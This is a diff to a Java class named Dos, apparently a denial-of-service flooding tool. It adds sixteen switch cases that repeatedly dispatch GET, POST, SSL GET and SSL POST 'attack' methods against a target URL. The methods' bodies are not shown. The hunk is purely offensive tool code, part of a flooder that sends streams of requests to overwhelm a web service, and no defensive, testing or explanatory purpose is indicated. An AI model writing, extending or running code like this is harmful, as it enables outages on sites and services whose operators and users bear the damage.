@@ -74,6 +74,54 @@ public class Dos implements Runnable {
                     case 16:
                         sslGetAttack(Dos.url);
                         break;
+                    case 17:
+                        postAttack(Dos.url);
+                        break;
+                    case 18:
+                        sslPostAttack(Dos.url);
+                        break;
+                    case 19:
+                        getAttack(Dos.url);
+                        break;
+                    case 20:
+                        sslGetAttack(Dos.url);
+                        break;
+                    case 21:
+                        postAttack(Dos.url);
+                        break;
+                    case 22:
+                        sslPostAttack(Dos.url);
+                        break;
+                    case 23:
+                        getAttack(Dos.url);
+                        break;
+                    case 24:
+                        sslGetAttack(Dos.url);
+                        break;
+                    case 25:
+                        postAttack(Dos.url);
+                        break;
+                    case 26:
+                        sslPostAttack(Dos.url);
+                        break;
+                    case 27:
+                        getAttack(Dos.url);
+                        break;
+                    case 28:
+                        sslGetAttack(Dos.url);
+                        break;
+                    case 29:
+                        postAttack(Dos.url);
+                        break;
+                    case 30:
+                        sslPostAttack(Dos.url);
+                        break;
+                    case 31:
+                        getAttack(Dos.url);
+                        break;
+                    case 32:
+                        sslGetAttack(Dos.url);
+                        break;
 
                 }
             }
